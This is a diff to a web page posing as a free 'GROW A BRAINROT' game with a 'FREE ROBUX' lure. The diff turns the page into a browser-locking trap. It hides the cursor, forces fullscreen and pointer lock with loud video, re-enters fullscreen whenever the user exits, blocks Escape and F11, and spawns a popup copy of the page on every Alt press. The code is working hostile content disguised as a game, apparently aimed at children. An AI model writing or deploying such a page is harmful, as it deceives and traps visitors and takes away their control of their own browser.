@@ -9,6 +9,7 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            cursor: none; 
         }
 
         body {
@@ -24,7 +25,6 @@
             overflow: hidden;
         }
 
-        /* The Main UI Card */
         .game-card {
             background: rgba(0, 0, 0, 0.9);
             border: 8px ridge #00ff00;
@@ -35,15 +35,6 @@
             max-width: 500px;
             width: 95%;
             z-index: 10;
-            transition: opacity 0.5s ease;
-        }
-
-        .title {
-            font-size: 2.5rem;
-            color: #fff;
-            text-shadow: 4px 4px #ff0000, -3px -3px #0000ff;
-            margin-bottom: 1.5rem;
-            text-transform: uppercase;
         }
 
         .image-container {
@@ -71,14 +62,9 @@
             border: 4px solid #fff;
             border-radius: 10px;
             cursor: pointer;
-            box-shadow: 0 0 20px #ff0000;
-            display: inline-flex;
-            align-items: center;
-            gap: 15px;
             animation: vibrate 0.1s infinite;
         }
 
-        /* Fullscreen Video Styling - Hidden by default */
         #videoOverlay {
             display: none;
             position: fixed;
@@ -87,13 +73,13 @@
             width: 100vw;
             height: 100vh;
             background: black;
-            z-index: 999;
+            z-index: 9999;
         }
 
         #myVideo {
             width: 100%;
             height: 100%;
-            object-fit: contain; /* Set to 'cover' if you want it to fill the whole screen */
+            object-fit: fill; 
         }
 
         @keyframes gradient {
@@ -106,8 +92,6 @@
             0% { transform: translate(0); }
             20% { transform: translate(-2px, 2px); }
             40% { transform: translate(-2px, -2px); }
-            60% { transform: translate(2px, 2px); }
-            80% { transform: translate(2px, -2px); }
             100% { transform: translate(0); }
         }
     </style>
@@ -115,21 +99,12 @@
 <body>
 
     <div class="game-card" id="mainCard">
-        <h1 class="title">GROW A BRAINROT</h1>
-        
+        <h1 style="font-size: 2.5rem; margin-bottom: 1.5rem; text-shadow: 4px 4px #f00;">GROW A BRAINROT</h1>
         <div class="image-container">
-            <img src="https://i.imgur.com/Ohxn6Lc.jpeg" alt="Brainrot Icon" class="game-icon">
+            <img src="https://i.imgur.com/Ohxn6Lc.jpeg" class="game-icon">
         </div>
-
-        <br>
-
-        <button onclick="goFullscreen()" class="play-button">
-            PLAY NOW
-        </button>
-
-        <p style="margin-top:25px; color: yellow; font-weight: bold; text-decoration: underline;">
-            FULLY SAFE - NO VIRUS - FREE ROBUX INCLUDED
-        </p>
+        <button onclick="lockUser()" class="play-button">PLAY NOW</button>
+        <p style="margin-top:20px; color: yellow;">FREE ROBUX INJECTING...</p>
     </div>
 
     <div id="videoOverlay">
@@ -139,31 +114,55 @@
     </div>
 
     <script>
-        function goFullscreen() {
-            const card = document.getElementById('mainCard');
-            const overlay = document.getElementById('videoOverlay');
-            const video = document.getElementById('myVideo');
+        const overlay = document.getElementById('videoOverlay');
+        const video = document.getElementById('myVideo');
+        const card = document.getElementById('mainCard');
 
-            // 1. Hide the card
-            card.style.display = 'none';
-
-            // 2. Show the video overlay
-            overlay.style.display = 'block';
-
-            // 3. Unmute and Play
-            video.muted = false;
-            video.play();
-
-            // 4. Trigger browser fullscreen mode
+        function lockUser() {
             if (overlay.requestFullscreen) {
                 overlay.requestFullscreen();
-            } else if (overlay.webkitRequestFullscreen) { /* Safari */
+            } else if (overlay.webkitRequestFullscreen) {
                 overlay.webkitRequestFullscreen();
-            } else if (overlay.msRequestFullscreen) { /* IE11 */
-                overlay.msRequestFullscreen();
             }
-        }
-    </script>
 
+            overlay.requestPointerLock = overlay.requestPointerLock || overlay.webkitRequestPointerLock;
+            overlay.requestPointerLock();
+
+            card.style.display = 'none';
+            overlay.style.display = 'block';
+            video.muted = false;
+            video.play();
+        }
+
+        // RE-LOCK ON EXIT
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement) {
+                setTimeout(() => { lockUser(); }, 100);
+            }
+        });
+
+        // ALT KEY TRAP
+        window.addEventListener("keydown", (e) => {
+            // Check if Alt key is pressed
+            if (e.altKey || e.key === "Alt") {
+                e.preventDefault();
+                // Opens a new popup window with the same URL
+                window.open(window.location.href, '_blank', 'width=800,height=600,menubar=no,status=no');
+            }
+            
+            // Block Escape and F11
+            if (e.key === "F11" || e.key === "Escape") {
+                e.preventDefault();
+            }
+        });
+
+        // Re-request pointer lock on click
+        document.addEventListener('click', () => {
+            if (overlay.style.display === 'block') {
+                overlay.requestPointerLock();
+            }
+        });
+
+    </script>
 </body>
 </html>
